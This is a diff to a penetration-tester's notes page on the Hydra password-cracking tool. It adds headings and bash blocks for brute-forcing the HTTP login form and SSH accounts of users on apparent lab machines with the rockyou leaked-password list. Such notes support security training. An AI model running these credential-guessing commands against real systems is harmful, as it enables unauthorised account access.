@@ -15,6 +15,8 @@ sudo make install
 
 ## Usage
 
+### HTTP
+
 ```
 Examples:
   hydra -l user -P passlist.txt ftp://192.168.0.1
@@ -24,10 +26,22 @@ Examples:
   hydra -L logins.txt -P pws.txt -M targets.txt ssh
 ```
 
-`hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.166.146 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`
+```bash
+hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.166.146 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+```
 
 ![](<../../.gitbook/assets/image (90).png>)
 
-`hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.166.146 -t 4 ssh`
+```bash
+hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.166.146 -t 4 ssh
+```
 
 ![](<../../.gitbook/assets/image (73).png>)
+
+### SSH
+
+```bash
+hydra -l joshua -P /usr/share/wordlists/rockyou.txt -V ssh://10.129.82.199
+```
+
+<figure><img src="../../.gitbook/assets/image (656).png" alt=""><figcaption></figcaption></figure>
